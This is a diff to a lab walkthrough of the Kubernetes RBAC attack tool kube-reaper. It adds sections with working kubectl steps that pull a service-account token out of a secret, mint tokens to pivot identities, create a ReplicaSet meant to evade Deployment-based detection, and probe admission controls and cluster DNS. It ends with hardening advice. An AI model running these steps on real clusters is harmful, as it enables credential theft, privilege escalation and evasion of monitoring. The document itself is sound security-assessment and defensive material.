@@ -171,7 +171,7 @@ The `cicd` namespace is the weak link. No PSS enforcement **and** we can create 
 
 ### Dangerous Permission Patterns
 
-[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has a library of 40+ dangerous RBAC permission patterns. It matches our permissions against every pattern and reports what we can do:
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has a library of 50 dangerous RBAC permission patterns. It matches our permissions against every pattern and reports what we can do:
 
 **CRITICAL:**
 - Create Pods (No PSS Enforcement) in cicd. This enables node breakout.
@@ -634,6 +634,90 @@ The method column tells you how each identity was reached:
 
 This distinction matters. SecretToken pivots work from any identity that can read secrets. TokenRequest pivots require `create` on `serviceaccounts/token`.
 
+### Manual Validation: Recursive Pivot
+
+We validate two pivot methods that [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found. All commands run on `k8s-control-plane-1` as `kubernetes-admin`.
+
+**SecretToken pivot: developer-token.** We extract the token from the secret and authenticate with it:
+
+```bash
+[k8s-control-plane-1] $ kubectl get secret developer-token -n development -o jsonpath="{.data.token}" | base64 -d > /tmp/pivot-dev-token.txt
+```
+
+Build a clean kubeconfig with the stolen token (no client certificates):
+
+```bash
+[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/pivot-val.yaml
+[k8s-control-plane-1] $ kubectl config set-credentials pivotdev --token=$(cat /tmp/pivot-dev-token.txt) --kubeconfig=/tmp/pivot-val.yaml
+[k8s-control-plane-1] $ kubectl config set-context pivotdev --cluster=lab --user=pivotdev --kubeconfig=/tmp/pivot-val.yaml
+[k8s-control-plane-1] $ kubectl config use-context pivotdev --kubeconfig=/tmp/pivot-val.yaml
+```
+
+```bash
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot-val.yaml auth whoami
+```
+
+```
+ATTRIBUTE   VALUE
+Username    system:serviceaccount:development:developer
+UID         28333d99-9b8e-4dff-b14f-f3b94dda9378
+Groups      [system:serviceaccounts system:serviceaccounts:development
+             system:authenticated]
+```
+
+Confirmed. The secret contains a valid non-expiring token. We pivoted to `developer`.
+
+**TokenRequest pivot: code-server.** We use the TokenRequest API to mint a short-lived token:
+
+```bash
+[k8s-control-plane-1] $ kubectl create token code-server -n development --duration=600s > /tmp/pivot-cs-token.txt
+```
+
+```bash
+[k8s-control-plane-1] $ kubectl config set-credentials pivotcs --token=$(cat /tmp/pivot-cs-token.txt) --kubeconfig=/tmp/pivot-val.yaml
+[k8s-control-plane-1] $ kubectl config set-context pivotcs --cluster=lab --user=pivotcs --kubeconfig=/tmp/pivot-val.yaml
+[k8s-control-plane-1] $ kubectl config use-context pivotcs --kubeconfig=/tmp/pivot-val.yaml
+```
+
+```bash
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot-val.yaml auth whoami
+```
+
+```
+ATTRIBUTE   VALUE
+Username    system:serviceaccount:development:code-server
+UID         b5ffa344-50cc-4cfe-9089-7f77ac95d89c
+Groups      [system:serviceaccounts system:serviceaccounts:development
+             system:authenticated]
+```
+
+Confirmed. We minted a token and pivoted to `code-server`. This identity has `create pods` in cicd with no PSS enforcement, so the pivot gives us the full breakout chain from Scan 1.
+
+**Bootstrap-signer further pivot.** We verify bootstrap-signer can read secrets in kube-system, which would let the pivot chain continue deeper:
+
+```bash
+[k8s-control-plane-1] $ kubectl create token bootstrap-signer -n kube-system --duration=600s > /tmp/pivot-bs-token.txt
+[k8s-control-plane-1] $ kubectl config set-credentials pivotbs --token=$(cat /tmp/pivot-bs-token.txt) --kubeconfig=/tmp/pivot-val.yaml
+[k8s-control-plane-1] $ kubectl config set-context pivotbs --cluster=lab --user=pivotbs --kubeconfig=/tmp/pivot-val.yaml
+[k8s-control-plane-1] $ kubectl config use-context pivotbs --kubeconfig=/tmp/pivot-val.yaml
+```
+
+```bash
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot-val.yaml auth can-i --list -n kube-system 2>/dev/null | grep secrets
+```
+
+```
+secrets   []   []   [get list watch]
+```
+
+Confirmed. The bootstrap-signer SA can `get`, `list`, and `watch` secrets in kube-system. If there were SA token secrets in kube-system, this identity could read them and pivot further. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) correctly flagged this as a further pivot capability.
+
+### Cleanup
+
+```bash
+[k8s-control-plane-1] $ rm -f /tmp/pivot-dev-token.txt /tmp/pivot-cs-token.txt /tmp/pivot-bs-token.txt /tmp/pivot-val.yaml
+```
+
 ---
 
 ## Scan 4: Unconventional RBAC Patterns
@@ -666,6 +750,77 @@ The admin scan found additional unconventional patterns across the cluster:
 - **Escalate verb** on ClusterRoles (clusterrole-aggregation-controller): bypasses RBAC escalation prevention
 - **Bind verb** on Roles (prod-debug-agent in production): allows binding existing roles to arbitrary subjects
 - **Modify ValidatingAdmissionPolicies** (generic-garbage-collector): could disable admission controls
+
+### Manual Validation: Direct ReplicaSet Creation
+
+We prove that code-server can deploy pods through a ReplicaSet without a Deployment. All commands run on `k8s-control-plane-1` using `--as` impersonation.
+
+First, confirm the permission:
+
+```bash
+[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server auth can-i create replicasets -n cicd
+yes
+```
+
+Create a ReplicaSet directly:
+
+```bash
+[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server apply -f - <<EOF
+apiVersion: apps/v1
+kind: ReplicaSet
+metadata:
+  name: stealth-rs
+  namespace: cicd
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: stealth
+  template:
+    metadata:
+      labels:
+        app: stealth
+    spec:
+      containers:
+      - name: beacon
+        image: busybox
+        command: ["sleep", "3600"]
+EOF
+```
+
+```
+replicaset.apps/stealth-rs created
+```
+
+The pod starts:
+
+```bash
+[k8s-control-plane-1] $ kubectl get pods -n cicd -l app=stealth --as=system:serviceaccount:development:code-server
+```
+
+```
+NAME               READY   STATUS    RESTARTS   AGE
+stealth-rs-jnrzm   0/1     ContainerCreating   0      7s
+```
+
+But there is no Deployment:
+
+```bash
+[k8s-control-plane-1] $ kubectl get deployments -n cicd --as=system:serviceaccount:development:code-server
+No resources found in cicd namespace.
+```
+
+The pod runs. No Deployment exists. Most audit tools and SIEM rules watch for Deployment creation events. A direct ReplicaSet bypasses that detection layer completely. The pod still gets a service account token, can mount volumes, and runs with whatever security context the namespace allows.
+
+### Cleanup
+
+```bash
+[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server delete replicaset stealth-rs -n cicd
+```
+
+```
+replicaset.apps "stealth-rs" deleted
+```
 
 ---
 
@@ -816,6 +971,143 @@ pod "sa-spec-test" deleted
 
 ---
 
+## Scan 6: DNS Service Discovery and Admission Controller Probing
+
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has two reconnaissance features that work without RBAC permissions for service listing or require only pod creation.
+
+**DNS Service Discovery** queries the cluster DNS server (CoreDNS) for common service names across all known namespaces. It does not need any RBAC permissions. It reads `/etc/resolv.conf` to find the DNS server, then sends A record lookups for 48 common service names (kubernetes, kube-dns, grafana, vault, argocd-server, etc.) across every namespace. Any service that resolves tells the attacker it exists, what namespace it belongs to, and its ClusterIP.
+
+**Admission Controller Probing** sends dry-run pod creates to map what the admission controller will accept or reject in each namespace. It uses `--dry-run=server`, so no pods are created. It tests six configurations: privileged, hostPID, hostNetwork, hostPath, CAP_SYS_ADMIN, and runAsRoot. The result tells the attacker exactly which dangerous pod configurations each namespace allows.
+
+We run this from inside the code-server pod:
+
+```bash
+[code-server pod] $ /tmp/kube-reaper
+```
+
+The scan output now includes two new sections:
+
+```
+DNS Discovered Services: 3
+Admission Controller: 2 probed (2 with weak enforcement)
+```
+
+### DNS Service Discovery
+
+```
+╔══════════════════════════════════════════════════╗
+║           DNS SERVICE DISCOVERY                  ║
+╚══════════════════════════════════════════════════╝
+  DNS Server: 10.96.0.10
+  Cluster Domain: cluster.local
+  Search Domains: development.svc.cluster.local, svc.cluster.local,
+                  cluster.local, home.arpa
+
+  Namespace: calico-system
+    ● calico-typha -> 10.102.20.240 (DNS A lookup)
+
+  Namespace: default
+    ● kubernetes -> 10.96.0.1 (DNS A lookup)
+
+  Namespace: kube-system
+    ● kube-dns -> 10.96.0.10 (DNS A lookup)
+```
+
+Without any RBAC permission to list services, [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found three services and their ClusterIPs. It also extracted the DNS server address (10.96.0.10), the cluster domain (cluster.local), and the search domains from `/etc/resolv.conf`.
+
+### Admission Controller Probing
+
+```
+╔══════════════════════════════════════════════════╗
+║           ADMISSION CONTROLLER PROBING            ║
+╚══════════════════════════════════════════════════╝
+  Dry-run pod probes (no pods created)
+
+  ● cicd [NO ENFORCEMENT]  6/6 probes allowed
+    │ privileged: ALLOWED
+    │ hostPID: ALLOWED
+    │ hostNetwork: ALLOWED
+    │ hostPath: ALLOWED
+    │ CAP_SYS_ADMIN: ALLOWED
+    │ runAsRoot: ALLOWED
+
+  ● development [PARTIAL]  1/6 probes allowed
+    │ privileged: DENIED
+    │   PodSecurity "baseline:latest": privileged
+    │ hostPID: DENIED
+    │   PodSecurity "baseline:latest": host namespaces
+    │ hostNetwork: DENIED
+    │   PodSecurity "baseline:latest": host namespaces
+    │ hostPath: DENIED
+    │   PodSecurity "baseline:latest": hostPath volumes
+    │ CAP_SYS_ADMIN: DENIED
+    │   PodSecurity "baseline:latest": non-default capabilities
+    │ runAsRoot: ALLOWED
+```
+
+This tells us:
+- **cicd** has no admission enforcement at all. Every dangerous pod configuration is allowed. This confirms the breakout chain from Scan 1.
+- **development** uses PSS `baseline` enforcement. It blocks privileged containers, host namespaces, hostPath volumes, and dangerous capabilities. But it allows `runAsRoot` (UID 0). The PSS baseline policy does not restrict the user ID.
+
+The 8 other namespaces do not appear because the code-server SA cannot create pods there. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) skips namespaces where RBAC blocks pod creation before testing admission.
+
+### Manual Validation: DNS Discovery
+
+We compare the DNS results against the actual cluster services. On the control plane as `kubernetes-admin`:
+
+```bash
+[k8s-control-plane-1] $ kubectl get svc -A
+```
+
+```
+NAMESPACE          NAME                              TYPE        CLUSTER-IP      PORT(S)
+calico-apiserver   calico-api                        ClusterIP   10.103.4.78     443/TCP
+calico-system      calico-kube-controllers-metrics   ClusterIP   None            9094/TCP
+calico-system      calico-typha                      ClusterIP   10.102.20.240   5473/TCP
+default            kubernetes                        ClusterIP   10.96.0.1       443/TCP
+kube-system        kube-dns                          ClusterIP   10.96.0.10      53/UDP,53/TCP
+```
+
+Five services exist in the cluster. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found three: `calico-typha` (10.102.20.240), `kubernetes` (10.96.0.1), and `kube-dns` (10.96.0.10). All three IPs match exactly. The two it missed (`calico-api` and `calico-kube-controllers-metrics`) have non-standard names not in the probe dictionary. This is a dictionary-based approach, so coverage depends on the service names. Three out of five with zero false positives from a pod that has no RBAC permission to list services.
+
+### Manual Validation: Admission Probing
+
+We verify the admission results with kubectl dry-run. All commands run on `k8s-control-plane-1`.
+
+**Privileged pod in cicd (should be ALLOWED):**
+
+```bash
+[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server run kr-val-priv --image=busybox --restart=Never --dry-run=server -n cicd --overrides='{"spec":{"containers":[{"name":"probe","image":"busybox","command":["true"],"securityContext":{"privileged":true}}]}}' -o name
+pod/kr-val-priv
+```
+
+Accepted. No admission controller blocked it.
+
+**Privileged pod in development (should be DENIED):**
+
+```bash
+[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server run kr-val-priv --image=busybox --restart=Never --dry-run=server -n development --overrides='{"spec":{"containers":[{"name":"probe","image":"busybox","command":["true"],"securityContext":{"privileged":true}}]}}' -o name
+```
+
+```
+Error from server (Forbidden): pods "kr-val-priv" is forbidden:
+violates PodSecurity "baseline:latest": privileged
+(container "probe" must not set securityContext.privileged=true)
+```
+
+Denied by PSS baseline. Exactly what [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) reported.
+
+**RunAsRoot in development (should be ALLOWED):**
+
+```bash
+[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server run kr-val-root --image=busybox --restart=Never --dry-run=server -n development --overrides='{"spec":{"containers":[{"name":"probe","image":"busybox","command":["true"],"securityContext":{"runAsUser":0}}]}}' -o name
+pod/kr-val-root
+```
+
+Accepted. PSS baseline does not block UID 0. This is a gap that defenders should know about. An attacker can still run containers as root in the development namespace, even with PSS baseline enforced.
+
+---
+
 ## Putting It Together: The Full Attack Chain
 
 Here is the complete path from developer pod to cluster admin, as [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) mapped it and as we validated manually:
@@ -905,7 +1197,7 @@ Path A is the privileged pod breakout. It gives you node-level access and every 
 | Capability | What it does | Why it matters |
 |-----------|-------------|----------------|
 | **Permission enumeration** | Maps your exact RBAC rules across every namespace | Shows what you can touch, not just what roles you have |
-| **Dangerous pattern matching** | 40+ patterns matched against your permissions | Catches things beyond "can create pods" |
+| **Dangerous pattern matching** | 50 patterns matched against your permissions | Catches things beyond "can create pods" |
 | **Attack chain analysis** | Chains permissions into multi-step escalation paths | Turns permission data into actionable attack plans |
 | **Namespace PSS mapping** | Correlates pod creation with PSS enforcement | Identifies which namespaces allow privileged pods |
 | **Pod security analysis** | Flags privileged pods, hostPath, hostPID, hostNetwork | Finds existing breakout-ready pods |
@@ -915,6 +1207,8 @@ Path A is the privileged pod breakout. It gives you node-level access and every 
 | **CRD attack surface** | Identifies dangerous CRDs (Calico, Istio, etc.) | Catches service mesh and CNI misconfiguration |
 | **SA spec identity pivot** | Detects pod creation + target SA in same namespace | Steals identities without reading secrets or minting tokens |
 | **Unconventional pattern detection** | Flags escalate/bind verbs, direct ReplicaSet creation, webhook manipulation | Catches what other tools miss |
+| **DNS service discovery** | Queries CoreDNS for 48 common service names across all namespaces | Finds services without RBAC permissions to list them |
+| **Admission controller probing** | Dry-run pod creates test what each namespace allows | Maps enforcement gaps before you commit to an attack |
 | **Severity filtering** | `--severity high` to focus on critical findings | Cuts noise during time-limited assessments |
 | **Token authentication** | `--token` + `--server` for direct access | Works from compromised pods with no kubeconfig |
 
@@ -930,6 +1224,8 @@ What would have stopped this attack chain:
 4. **Separate list from get on secrets.** prod-debug-agent can list secret names cluster-wide. This leaks the names and types of all secrets.
 5. **Audit the bind verb.** prod-debug-agent can bind roles in production. This is one step from privilege escalation.
 6. **Monitor ReplicaSet creation.** Audit policies should catch direct ReplicaSet creation, not just Deployments.
+7. **Use PSS `restricted` instead of `baseline` where possible.** The `baseline` policy allows `runAsRoot` (UID 0). An attacker can still run containers as root even with `baseline` enforced. The `restricted` policy blocks this.
+8. **Apply admission enforcement to all namespaces.** The cicd namespace had zero enforcement. Any identity with pod creation in that namespace can deploy privileged containers with no admission check.
 
 Run [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) against your own cluster. The output tells you exactly where the gaps are and how an attacker would use them.
 
